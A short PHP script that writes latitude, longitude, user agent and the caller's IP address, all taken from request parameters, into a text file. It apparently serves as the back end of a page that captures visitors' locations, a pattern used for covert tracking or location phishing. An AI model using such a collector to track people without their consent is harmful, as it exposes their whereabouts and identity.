<?php

$myfile = fopen("Data.txt", "w");
$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: ". $_SERVER["REMOTE_ADDR"] . "\nUserAgent:" .$_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);

?>